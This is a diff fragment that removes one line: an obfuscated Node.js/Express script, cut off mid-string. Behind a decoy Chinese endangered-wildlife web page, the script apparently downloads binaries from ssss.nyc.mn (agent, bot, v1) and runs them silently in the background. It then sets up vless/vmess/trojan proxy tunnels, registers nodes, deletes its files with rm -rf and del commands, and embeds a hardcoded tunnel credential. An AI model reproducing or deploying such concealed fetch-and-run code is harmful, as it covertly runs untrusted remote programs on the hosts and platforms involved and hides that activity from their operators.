@@ -1,1 +1,965 @@
-const _0x3752e6=_0x488c;(function(_0x212185,_0x202658){const _0x217631=_0x488c,_0x17fb44=_0x212185();while(!![]){try{const _0x3a9c67=-parseInt(_0x217631(0x1e7))/0x1+parseInt(_0x217631(0x197))/0x2+parseInt(_0x217631(0x208))/0x3+-parseInt(_0x217631(0x1d4))/0x4+-parseInt(_0x217631(0x1f1))/0x5*(parseInt(_0x217631(0x17c))/0x6)+-parseInt(_0x217631(0x1bb))/0x7+parseInt(_0x217631(0x1cf))/0x8*(parseInt(_0x217631(0x230))/0x9);if(_0x3a9c67===_0x202658)break;else _0x17fb44['push'](_0x17fb44['shift']());}catch(_0x1929fe){_0x17fb44['push'](_0x17fb44['shift']());}}}(_0x46ba,0xc0a5a));const express=require(_0x3752e6(0x1a0)),app=express(),axios=require(_0x3752e6(0x1d2)),os=require('os'),fs=require('fs'),path=require(_0x3752e6(0x218)),{promisify}=require(_0x3752e6(0x186)),exec=promisify(require(_0x3752e6(0x1a8))[_0x3752e6(0x18a)]),UPLOAD_URL=process.env.UPLOAD_URL||'',PROJECT_URL=process.env.PROJECT_URL||'',AUTO_ACCESS=process.env.AUTO_ACCESS||![],FILE_PATH=process.env.FILE_PATH||_0x3752e6(0x214),SUB_PATH=process.env.SUB_PATH||'cfg',PORT=process.env.SERVER_PORT||process.env.PORT||0xbb8,UUID=process.env.UUID||_0x3752e6(0x205),NEZHA_SERVER=process.env.NEZHA_SERVER||'',NEZHA_PORT=process.env.NEZHA_PORT||'',NEZHA_KEY=process.env.NEZHA_KEY||'',ARGO_DOMAIN=process.env.ARGO_DOMAIN||_0x3752e6(0x1c0),ARGO_AUTH=process.env.ARGO_AUTH||'eyJhIjoiNTJhODQzYzdiZWNiZDFjMGEwNzU2YjFjZjQ5ODM5NDgiLCJ0IjoiOWE3NjUzZGEtMDdlOC00YTc5LWE0OWYtNTM3N2E0MmUxNjI5IiwicyI6IlptUmxNekl3TnpFdE9ERmhOUzAwTm1SbUxXSTFaREV0TkRaak9ESmpNemxtWlRsaiJ9',ARGO_PORT=process.env.ARGO_PORT||0x1f41,CFIP=process.env.CFIP||_0x3752e6(0x209),CFPORT=process.env.CFPORT||0x1bb,NAME=process.env.NAME||'freeym';function _0x488c(_0x17cbff,_0x27ee15){_0x17cbff=_0x17cbff-0x17a;const _0x46baf9=_0x46ba();let _0x488c79=_0x46baf9[_0x17cbff];return _0x488c79;}!fs[_0x3752e6(0x1f6)](FILE_PATH)?(fs[_0x3752e6(0x180)](FILE_PATH),console[_0x3752e6(0x1c7)](FILE_PATH+_0x3752e6(0x22b))):console[_0x3752e6(0x1c7)](FILE_PATH+_0x3752e6(0x194));function _0x46ba(){const _0x59a9db=['data','exec','pop','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','&path=%2Fvless-argo%3Fed%3D2560#','Download\x20','ARGO_DOMAIN:','country_code','tls','https://arm64.ssss.nyc.mn/agent','arm','\x20already\x20exists','/api/add-nodes','tunnel.json','581394Mvuixe','/dev/null','split','Add\x20automatic\x20access\x20task\x20faild:\x20','https://arm64.ssss.nyc.mn/bot','https://amd64.ssss.nyc.mn/bot','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','stream','basename','express','statSync','freedom','trojan','base64','win32','unshift','direct','child_process','\x0a\x0atrojan://','arm64','message','arch','stringify','https://arm64.ssss.nyc.mn/v1','Mozilla/5.0','list.txt','\x0avless://','unlinkSync','boot.log','/vmess-argo','/vless-argo','none','\x20>/dev/null\x202>&1','443','charAt','Empowerment\x20failed\x20for\x20','4501448SRmXgX','catch','127.0.0.1','amd','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','freeym.liummei.dpdns.org','match','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','sub.txt','App\x20is\x20running','Error\x20executing\x20command:\x20','php\x20running\x20error:\x20','log','\x0a\x0avmess://','getFullYear','\x20>\x20nul\x202>&1','\x0a\x20\x20\x20\x20','Unhandled\x20error\x20in\x20startserver:','\x20-c\x20','tcp','652664fhylPz','.exe\x20>\x20nul\x202>&1','\x0aclient_secret:\x20','axios','abcdefghijklmnopqrstuvwxyz','5612204VyNWuj','http','pipe','web\x20running\x20error:\x20','status','Error\x20reading\x20boot.log:','Content-Type','?encryption=none&security=tls&sni=','vless','&fp=firefox&type=ws&host=','rm\x20-rf\x20','pkill\x20-f\x20\x22[','del\x20/f\x20/q\x20','createWriteStream','Empowerment\x20success\x20for\x20','\x0a\x20\x20credentials-file:\x20','/trojan-argo','length','<!DOCTYPE\x20html>\x0a<html\x20lang=\x22zh-CN\x22>\x0a<head>\x0a\x20\x20<meta\x20charset=\x22UTF-8\x22>\x0a\x20\x20<meta\x20name=\x22viewport\x22\x20content=\x22width=device-width,\x20initial-scale=1.0\x22>\x0a\x20\x20<title>守护生灵\x20-\x20野生动物保护</title>\x0a\x20\x20<style>\x0a\x20\x20\x20\x20*\x20{\x20margin:\x200;\x20padding:\x200;\x20box-sizing:\x20border-box;\x20}\x0a\x0a\x20\x20\x20\x20body\x20{\x0a\x20\x20\x20\x20\x20\x20font-family:\x20-apple-system,\x20\x27Segoe\x20UI\x27,\x20\x27PingFang\x20SC\x27,\x20\x27Microsoft\x20YaHei\x27,\x20sans-serif;\x0a\x20\x20\x20\x20\x20\x20background:\x20#0a1628;\x0a\x20\x20\x20\x20\x20\x20color:\x20#e0e8f0;\x0a\x20\x20\x20\x20\x20\x20min-height:\x20100vh;\x0a\x20\x20\x20\x20\x20\x20overflow-x:\x20hidden;\x0a\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20/*\x20星空粒子背景\x20*/\x0a\x20\x20\x20\x20.stars\x20{\x0a\x20\x20\x20\x20\x20\x20position:\x20fixed;\x20top:\x200;\x20left:\x200;\x20width:\x20100%;\x20height:\x20100%;\x0a\x20\x20\x20\x20\x20\x20pointer-events:\x20none;\x20z-index:\x200;\x0a\x20\x20\x20\x20\x20\x20background:\x20radial-gradient(ellipse\x20at\x2020%\x2050%,\x20#0d2137\x200%,\x20#0a1628\x20100%);\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20\x20.stars::before,\x20.stars::after\x20{\x0a\x20\x20\x20\x20\x20\x20content:\x20\x27\x27;\x20position:\x20absolute;\x20top:\x200;\x20left:\x200;\x20right:\x200;\x20bottom:\x200;\x0a\x20\x20\x20\x20\x20\x20background-image:\x0a\x20\x20\x20\x20\x20\x20\x20\x20radial-gradient(2px\x202px\x20at\x2020px\x2030px,\x20#ffffff33,\x20transparent),\x0a\x20\x20\x20\x20\x20\x20\x20\x20radial-gradient(2px\x202px\x20at\x2040px\x2070px,\x20#ffffff22,\x20transparent),\x0a\x20\x20\x20\x20\x20\x20\x20\x20radial-gradient(1px\x201px\x20at\x2090px\x2040px,\x20#ffffff44,\x20transparent),\x0a\x20\x20\x20\x20\x20\x20\x20\x20radial-gradient(1px\x201px\x20at\x20130px\x2080px,\x20#ffffff33,\x20transparent),\x0a\x20\x20\x20\x20\x20\x20\x20\x20radial-gradient(2px\x202px\x20at\x20160px\x2030px,\x20#ffffff22,\x20transparent);\x0a\x20\x20\x20\x20\x20\x20background-size:\x20200px\x20100px;\x0a\x20\x20\x20\x20\x20\x20animation:\x20twinkle\x204s\x20ease-in-out\x20infinite\x20alternate;\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20\x20.stars::after\x20{\x20background-size:\x20300px\x20150px;\x20animation-duration:\x206s;\x20}\x0a\x20\x20\x20\x20@keyframes\x20twinkle\x20{\x20from\x20{\x20opacity:\x200.4;\x20}\x20to\x20{\x20opacity:\x201;\x20}\x20}\x0a\x0a\x20\x20\x20\x20/*\x20头部\x20*/\x0a\x20\x20\x20\x20header\x20{\x0a\x20\x20\x20\x20\x20\x20position:\x20relative;\x20z-index:\x201;\x0a\x20\x20\x20\x20\x20\x20text-align:\x20center;\x0a\x20\x20\x20\x20\x20\x20padding:\x2060px\x2020px\x2040px;\x0a\x20\x20\x20\x20\x20\x20background:\x20linear-gradient(180deg,\x20rgba(16,42,76,0.8)\x200%,\x20transparent\x20100%);\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20\x20header\x20.logo\x20{\x20font-size:\x2056px;\x20margin-bottom:\x208px;\x20animation:\x20float\x203s\x20ease-in-out\x20infinite;\x20}\x0a\x20\x20\x20\x20@keyframes\x20float\x20{\x0a\x20\x20\x20\x20\x20\x200%,\x20100%\x20{\x20transform:\x20translateY(0);\x20}\x0a\x20\x20\x20\x20\x20\x2050%\x20{\x20transform:\x20translateY(-10px);\x20}\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20\x20header\x20h1\x20{\x0a\x20\x20\x20\x20\x20\x20font-size:\x2042px;\x20font-weight:\x20800;\x0a\x20\x20\x20\x20\x20\x20background:\x20linear-gradient(135deg,\x20#4ade80,\x20#22d3ee,\x20#818cf8);\x0a\x20\x20\x20\x20\x20\x20-webkit-background-clip:\x20text;\x20-webkit-text-fill-color:\x20transparent;\x0a\x20\x20\x20\x20\x20\x20background-clip:\x20text;\x0a\x20\x20\x20\x20\x20\x20letter-spacing:\x202px;\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20\x20header\x20p\x20{\x0a\x20\x20\x20\x20\x20\x20margin-top:\x2012px;\x20font-size:\x2018px;\x20color:\x20#94a3b8;\x0a\x20\x20\x20\x20\x20\x20max-width:\x20600px;\x20margin-left:\x20auto;\x20margin-right:\x20auto;\x0a\x20\x20\x20\x20\x20\x20line-height:\x201.6;\x0a\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20/*\x20统计数据\x20*/\x0a\x20\x20\x20\x20.stats\x20{\x0a\x20\x20\x20\x20\x20\x20position:\x20relative;\x20z-index:\x201;\x0a\x20\x20\x20\x20\x20\x20display:\x20flex;\x20justify-content:\x20center;\x20gap:\x2040px;\x0a\x20\x20\x20\x20\x20\x20padding:\x2030px\x2020px;\x20flex-wrap:\x20wrap;\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20\x20.stat-card\x20{\x0a\x20\x20\x20\x20\x20\x20text-align:\x20center;\x20padding:\x2024px\x2032px;\x0a\x20\x20\x20\x20\x20\x20background:\x20rgba(255,255,255,0.04);\x0a\x20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20rgba(255,255,255,0.08);\x0a\x20\x20\x20\x20\x20\x20border-radius:\x2016px;\x0a\x20\x20\x20\x20\x20\x20backdrop-filter:\x20blur(12px);\x0a\x20\x20\x20\x20\x20\x20transition:\x20transform\x200.3s,\x20box-shadow\x200.3s;\x0a\x20\x20\x20\x20\x20\x20min-width:\x20160px;\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20\x20.stat-card:hover\x20{\x0a\x20\x20\x20\x20\x20\x20transform:\x20translateY(-6px);\x0a\x20\x20\x20\x20\x20\x20box-shadow:\x200\x2012px\x2040px\x20rgba(74,222,128,0.15);\x0a\x20\x20\x20\x20\x20\x20border-color:\x20rgba(74,222,128,0.3);\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20\x20.stat-card\x20.num\x20{\x0a\x20\x20\x20\x20\x20\x20font-size:\x2036px;\x20font-weight:\x20800;\x0a\x20\x20\x20\x20\x20\x20background:\x20linear-gradient(135deg,\x20#f97316,\x20#ef4444);\x0a\x20\x20\x20\x20\x20\x20-webkit-background-clip:\x20text;\x20-webkit-text-fill-color:\x20transparent;\x0a\x20\x20\x20\x20\x20\x20background-clip:\x20text;\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20\x20.stat-card\x20.label\x20{\x20margin-top:\x208px;\x20font-size:\x2014px;\x20color:\x20#94a3b8;\x20}\x0a\x0a\x20\x20\x20\x20/*\x20动物卡片区\x20*/\x0a\x20\x20\x20\x20.section-title\x20{\x0a\x20\x20\x20\x20\x20\x20position:\x20relative;\x20z-index:\x201;\x0a\x20\x20\x20\x20\x20\x20text-align:\x20center;\x20font-size:\x2028px;\x20font-weight:\x20700;\x0a\x20\x20\x20\x20\x20\x20margin:\x2050px\x200\x2030px;\x0a\x20\x20\x20\x20\x20\x20color:\x20#e2e8f0;\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20\x20.section-title\x20span\x20{\x0a\x20\x20\x20\x20\x20\x20background:\x20linear-gradient(135deg,\x20#4ade80,\x20#22d3ee);\x0a\x20\x20\x20\x20\x20\x20-webkit-background-clip:\x20text;\x20-webkit-text-fill-color:\x20transparent;\x0a\x20\x20\x20\x20\x20\x20background-clip:\x20text;\x0a\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20.animals\x20{\x0a\x20\x20\x20\x20\x20\x20position:\x20relative;\x20z-index:\x201;\x0a\x20\x20\x20\x20\x20\x20display:\x20grid;\x0a\x20\x20\x20\x20\x20\x20grid-template-columns:\x20repeat(auto-fit,\x20minmax(280px,\x201fr));\x0a\x20\x20\x20\x20\x20\x20gap:\x2024px;\x20padding:\x200\x2040px;\x20max-width:\x201200px;\x20margin:\x200\x20auto;\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20\x20.animal-card\x20{\x0a\x20\x20\x20\x20\x20\x20background:\x20linear-gradient(145deg,\x20rgba(255,255,255,0.06),\x20rgba(255,255,255,0.02));\x0a\x20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20rgba(255,255,255,0.08);\x0a\x20\x20\x20\x20\x20\x20border-radius:\x2020px;\x20overflow:\x20hidden;\x0a\x20\x20\x20\x20\x20\x20transition:\x20transform\x200.4s,\x20box-shadow\x200.4s;\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20\x20.animal-card:hover\x20{\x0a\x20\x20\x20\x20\x20\x20transform:\x20translateY(-8px)\x20scale(1.02);\x0a\x20\x20\x20\x20\x20\x20box-shadow:\x200\x2020px\x2060px\x20rgba(34,211,238,0.12);\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20\x20.animal-card\x20.emoji\x20{\x0a\x20\x20\x20\x20\x20\x20font-size:\x2072px;\x20text-align:\x20center;\x20padding:\x2036px\x200\x2016px;\x0a\x20\x20\x20\x20\x20\x20filter:\x20drop-shadow(0\x204px\x2012px\x20rgba(0,0,0,0.3));\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20\x20.animal-card\x20.info\x20{\x20padding:\x200\x2024px\x2028px;\x20}\x0a\x20\x20\x20\x20.animal-card\x20h3\x20{\x20font-size:\x2020px;\x20color:\x20#f1f5f9;\x20margin-bottom:\x204px;\x20}\x0a\x20\x20\x20\x20.animal-card\x20.latin\x20{\x20font-size:\x2013px;\x20color:\x20#64748b;\x20font-style:\x20italic;\x20margin-bottom:\x2012px;\x20}\x0a\x20\x20\x20\x20.animal-card\x20.desc\x20{\x20font-size:\x2014px;\x20color:\x20#94a3b8;\x20line-height:\x201.7;\x20}\x0a\x20\x20\x20\x20.animal-card\x20.tag\x20{\x0a\x20\x20\x20\x20\x20\x20display:\x20inline-block;\x20margin-top:\x2014px;\x0a\x20\x20\x20\x20\x20\x20padding:\x204px\x2014px;\x20border-radius:\x2020px;\x0a\x20\x20\x20\x20\x20\x20font-size:\x2012px;\x20font-weight:\x20600;\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20\x20.tag-cr\x20{\x20background:\x20rgba(239,68,68,0.15);\x20color:\x20#f87171;\x20border:\x201px\x20solid\x20rgba(239,68,68,0.3);\x20}\x0a\x20\x20\x20\x20.tag-en\x20{\x20background:\x20rgba(251,146,60,0.15);\x20color:\x20#fb923c;\x20border:\x201px\x20solid\x20rgba(251,146,60,0.3);\x20}\x0a\x20\x20\x20\x20.tag-vu\x20{\x20background:\x20rgba(250,204,21,0.15);\x20color:\x20#facc15;\x20border:\x201px\x20solid\x20rgba(250,204,21,0.3);\x20}\x0a\x0a\x20\x20\x20\x20/*\x20行动呼吁\x20*/\x0a\x20\x20\x20\x20.cta\x20{\x0a\x20\x20\x20\x20\x20\x20position:\x20relative;\x20z-index:\x201;\x0a\x20\x20\x20\x20\x20\x20text-align:\x20center;\x20padding:\x2070px\x2020px\x2040px;\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20\x20.cta\x20h2\x20{\x0a\x20\x20\x20\x20\x20\x20font-size:\x2032px;\x20font-weight:\x20700;\x20margin-bottom:\x2016px;\x20color:\x20#f1f5f9;\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20\x20.cta\x20p\x20{\x20font-size:\x2016px;\x20color:\x20#94a3b8;\x20max-width:\x20560px;\x20margin:\x200\x20auto\x2030px;\x20line-height:\x201.7;\x20}\x0a\x20\x20\x20\x20.cta-actions\x20{\x20display:\x20flex;\x20justify-content:\x20center;\x20gap:\x2020px;\x20flex-wrap:\x20wrap;\x20}\x0a\x20\x20\x20\x20.cta-btn\x20{\x0a\x20\x20\x20\x20\x20\x20display:\x20inline-flex;\x20align-items:\x20center;\x20gap:\x208px;\x0a\x20\x20\x20\x20\x20\x20padding:\x2014px\x2036px;\x20border-radius:\x2050px;\x20border:\x20none;\x0a\x20\x20\x20\x20\x20\x20font-size:\x2016px;\x20font-weight:\x20600;\x20cursor:\x20pointer;\x0a\x20\x20\x20\x20\x20\x20text-decoration:\x20none;\x20transition:\x20all\x200.3s;\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20\x20.cta-btn.primary\x20{\x0a\x20\x20\x20\x20\x20\x20background:\x20linear-gradient(135deg,\x20#4ade80,\x20#22d3ee);\x0a\x20\x20\x20\x20\x20\x20color:\x20#0a1628;\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20\x20.cta-btn.primary:hover\x20{\x20transform:\x20scale(1.06);\x20box-shadow:\x200\x208px\x2030px\x20rgba(74,222,128,0.4);\x20}\x0a\x20\x20\x20\x20.cta-btn.secondary\x20{\x0a\x20\x20\x20\x20\x20\x20background:\x20rgba(255,255,255,0.06);\x0a\x20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20rgba(255,255,255,0.15);\x0a\x20\x20\x20\x20\x20\x20color:\x20#e2e8f0;\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20\x20.cta-btn.secondary:hover\x20{\x20background:\x20rgba(255,255,255,0.12);\x20transform:\x20scale(1.06);\x20}\x0a\x0a\x20\x20\x20\x20/*\x20知识科普\x20*/\x0a\x20\x20\x20\x20.tips\x20{\x0a\x20\x20\x20\x20\x20\x20position:\x20relative;\x20z-index:\x201;\x0a\x20\x20\x20\x20\x20\x20max-width:\x20900px;\x20margin:\x2020px\x20auto\x2040px;\x20padding:\x200\x2040px;\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20\x20.tip-item\x20{\x0a\x20\x20\x20\x20\x20\x20display:\x20flex;\x20align-items:\x20flex-start;\x20gap:\x2016px;\x0a\x20\x20\x20\x20\x20\x20padding:\x2020px\x2024px;\x20margin-bottom:\x2016px;\x0a\x20\x20\x20\x20\x20\x20background:\x20rgba(255,255,255,0.03);\x0a\x20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20rgba(255,255,255,0.06);\x0a\x20\x20\x20\x20\x20\x20border-radius:\x2014px;\x0a\x20\x20\x20\x20\x20\x20transition:\x20all\x200.3s;\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20\x20.tip-item:hover\x20{\x20background:\x20rgba(255,255,255,0.06);\x20border-color:\x20rgba(74,222,128,0.2);\x20}\x0a\x20\x20\x20\x20.tip-item\x20.icon\x20{\x20font-size:\x2028px;\x20flex-shrink:\x200;\x20margin-top:\x202px;\x20}\x0a\x20\x20\x20\x20.tip-item\x20.text\x20h4\x20{\x20font-size:\x2016px;\x20color:\x20#e2e8f0;\x20margin-bottom:\x206px;\x20}\x0a\x20\x20\x20\x20.tip-item\x20.text\x20p\x20{\x20font-size:\x2014px;\x20color:\x20#94a3b8;\x20line-height:\x201.6;\x20}\x0a\x0a\x20\x20\x20\x20/*\x20页脚\x20*/\x0a\x20\x20\x20\x20footer\x20{\x0a\x20\x20\x20\x20\x20\x20position:\x20relative;\x20z-index:\x201;\x0a\x20\x20\x20\x20\x20\x20text-align:\x20center;\x20padding:\x2040px\x2020px;\x0a\x20\x20\x20\x20\x20\x20border-top:\x201px\x20solid\x20rgba(255,255,255,0.06);\x0a\x20\x20\x20\x20\x20\x20color:\x20#475569;\x20font-size:\x2013px;\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20\x20footer\x20.hearts\x20{\x20font-size:\x2024px;\x20margin-bottom:\x2010px;\x20letter-spacing:\x204px;\x20}\x0a\x0a\x20\x20\x20\x20@media\x20(max-width:\x20640px)\x20{\x0a\x20\x20\x20\x20\x20\x20header\x20h1\x20{\x20font-size:\x2030px;\x20}\x0a\x20\x20\x20\x20\x20\x20header\x20.logo\x20{\x20font-size:\x2042px;\x20}\x0a\x20\x20\x20\x20\x20\x20.stats\x20{\x20gap:\x2016px;\x20}\x0a\x20\x20\x20\x20\x20\x20.stat-card\x20{\x20min-width:\x20120px;\x20padding:\x2016px\x2020px;\x20}\x0a\x20\x20\x20\x20\x20\x20.stat-card\x20.num\x20{\x20font-size:\x2028px;\x20}\x0a\x20\x20\x20\x20\x20\x20.animals\x20{\x20padding:\x200\x2016px;\x20}\x0a\x20\x20\x20\x20\x20\x20.tips\x20{\x20padding:\x200\x2016px;\x20}\x0a\x20\x20\x20\x20}\x0a\x20\x20</style>\x0a</head>\x0a<body>\x0a\x20\x20<div\x20class=\x22stars\x22></div>\x0a\x0a\x20\x20<header>\x0a\x20\x20\x20\x20<div\x20class=\x22logo\x22>🌍</div>\x0a\x20\x20\x20\x20<h1>守护生灵</h1>\x0a\x20\x20\x20\x20<p>每一个物种的消逝，都是地球生命之书中被撕去的一页。<br>保护野生动物，就是守护我们共同的未来。</p>\x0a\x20\x20</header>\x0a\x0a\x20\x20<div\x20class=\x22stats\x22>\x0a\x20\x20\x20\x20<div\x20class=\x22stat-card\x22>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22num\x22>41,000+</div>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22label\x22>受威胁物种</div>\x0a\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20<div\x20class=\x22stat-card\x22>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22num\x22>1,000,000</div>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22label\x22>面临灭绝的物种</div>\x0a\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20<div\x20class=\x22stat-card\x22>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22num\x22>68%</div>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22label\x22>野生动物种群下降</div>\x0a\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20<div\x20class=\x22stat-card\x22>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22num\x22>150+</div>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22label\x22>每日灭绝物种数</div>\x0a\x20\x20\x20\x20</div>\x0a\x20\x20</div>\x0a\x0a\x20\x20<h2\x20class=\x22section-title\x22>🦁\x20<span>濒危物种档案</span></h2>\x0a\x0a\x20\x20<div\x20class=\x22animals\x22>\x0a\x20\x20\x20\x20<div\x20class=\x22animal-card\x22>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22emoji\x22>🐼</div>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22info\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<h3>大熊猫</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22latin\x22>Ailuropoda\x20melanoleuca</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22desc\x22>中国国宝，全球生物多样性保护的旗舰物种。由于栖息地破碎化，野外种群仅存约1,800只，经数十年保护已从濒危降级为易危。</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22tag\x20tag-vu\x22>易危\x20VU</span>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20<div\x20class=\x22animal-card\x22>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22emoji\x22>🐅</div>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22info\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<h3>华南虎</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22latin\x22>Panthera\x20tigris\x20amoyensis</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22desc\x22>中国特有虎亚种，曾广泛分布于华南地区。因栖息地丧失与偷猎，野外已功能性灭绝，目前仅有少量圈养个体存活。</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22tag\x20tag-cr\x22>极危\x20CR</span>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20<div\x20class=\x22animal-card\x22>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22emoji\x22>🐘</div>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22info\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<h3>亚洲象</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22latin\x22>Elephas\x20maximus</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22desc\x22>地球上最大的陆地动物之一。因象牙贸易和栖息地缩减，全球野外种群不足5万头，中国境内仅约300头。</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22tag\x20tag-en\x22>濒危\x20EN</span>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20<div\x20class=\x22animal-card\x22>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22emoji\x22>🐋</div>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22info\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<h3>蓝鲸</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22latin\x22>Balaenoptera\x20musculus</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22desc\x22>地球上有史以来最大的动物，体长可达30米。20世纪商业捕鲸几乎将其推向灭绝，目前全球仅存约1万至2.5万头。</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22tag\x20tag-en\x22>濒危\x20EN</span>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20<div\x20class=\x22animal-card\x22>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22emoji\x22>🦏</div>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22info\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<h3>犀牛</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22latin\x22>Rhinocerotidae</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22desc\x22>地球上最古老的哺乳动物之一，已在地球上生存超过5000万年。因犀角贸易猖獗，多个亚种已经灭绝，北白犀仅剩2头。</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22tag\x20tag-cr\x22>极危\x20CR</span>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20<div\x20class=\x22animal-card\x22>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22emoji\x22>🦅</div>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22info\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<h3>中华秋沙鸭</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22latin\x22>Mergus\x20squamatus</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22desc\x22>被誉为\x22水中活化石\x22的珍稀鸟类，对水质极为敏感，是生态环境的指示物种。全球仅存约5,000只左右。</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22tag\x20tag-en\x22>濒危\x20EN</span>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20</div>\x0a\x20\x20</div>\x0a\x0a\x20\x20<div\x20class=\x22cta\x22>\x0a\x20\x20\x20\x20<h2>每个人都能成为守护者</h2>\x0a\x20\x20\x20\x20<p>保护野生动物不需要超能力，只需要你我每一个微小的行动。拒绝野味、不购买野生动物制品、支持生态保护项目。</p>\x0a\x20\x20\x20\x20<div\x20class=\x22cta-actions\x22>\x0a\x20\x20\x20\x20\x20\x20<a\x20class=\x22cta-btn\x20primary\x22\x20href=\x22https://www.worldwildlife.org\x22\x20target=\x22_blank\x22>🌱\x20了解更多</a>\x0a\x20\x20\x20\x20\x20\x20<a\x20class=\x22cta-btn\x20secondary\x22\x20href=\x22https://www.iucnredlist.org\x22\x20target=\x22_blank\x22>📋\x20IUCN\x20红色名录</a>\x0a\x20\x20\x20\x20</div>\x0a\x20\x20</div>\x0a\x0a\x20\x20<h2\x20class=\x22section-title\x22>💡\x20<span>你可以做的事</span></h2>\x0a\x0a\x20\x20<div\x20class=\x22tips\x22>\x0a\x20\x20\x20\x20<div\x20class=\x22tip-item\x22>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22icon\x22>🚫</div>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22text\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<